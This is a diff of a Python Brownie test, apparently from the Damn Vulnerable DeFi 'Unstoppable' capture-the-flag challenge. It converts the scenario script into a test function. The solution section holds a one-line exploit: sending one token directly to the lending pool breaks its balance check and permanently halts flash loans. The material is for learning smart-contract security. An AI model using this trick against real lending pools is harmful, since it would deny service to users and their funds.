@@ -1,13 +1,10 @@
 from scripts.helper.utils import *
 from brownie import UnstoppableLender, ReceiverUnstoppable, DamnValuableToken
 
-def main():
+def test_solve_challenge():
     ####################################################################
     ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
     ####################################################################
-
-    # starting setup messages
-    message('setup_start')
 
     # tokens in pool and initial attacker balance
     TOKENS_IN_POOL = ether_to_wei(1000000)
@@ -34,25 +31,21 @@ def main():
     receiver_contract.executeFlashLoan(10, _fromSomeUser)
 
     # check if solved
-    def solution_assertion():
-        message('final_assertion_check')
-        try:
+    def check_solution():
+        ############################################
+        ############ SUCCESS CONDITIONS ############
+        ############################################
 
-            ############################################
-            ############ SUCCESS CONDITIONS ############
-            ############################################
-
-            # It is no longer possible to execute flash loans
+        # It is no longer possible to execute flash loans
+        try:     
             receiver_contract.executeFlashLoan(10, _fromSomeUser)
-            return False
-
         except:
-            return True
+            assert True
+            return
+        assert False
+        
 
-    # done setting up
-    message('setup_end')
-    message('solution_start')
-# #########################################################
+# ######################################################### 
 # There's a lending pool with a million DVT tokens in balance, offering flash loans for free.
 #
 # If only there was a way to attack and stop the pool from offering flash loans ...
@@ -60,15 +53,14 @@ def main():
 # You start with 100 DVT tokens in balance.
 # #########################################################
 
-    ##############################
-    ##### SOLUTION GOES HERE #####
-    ##############################
+    #############################
+    ##### SOLUTION GOES HERE #### 
+    #############################
 
     # transfer some tokens to the attacker contract, which will subsequently send them to the pool to increase balanceBefore so it doesn't match with poolBalance
     token.transfer(pool.address, 1, _fromAttacker)
-        
-###############################################################
-###################### CHECKING SOLUTION ######################
-###############################################################
-    message('solution_end')
-    print(f'Challenge is solved: {solution_assertion()}')
+    
+    ######################
+    check_solution()
+    
+    
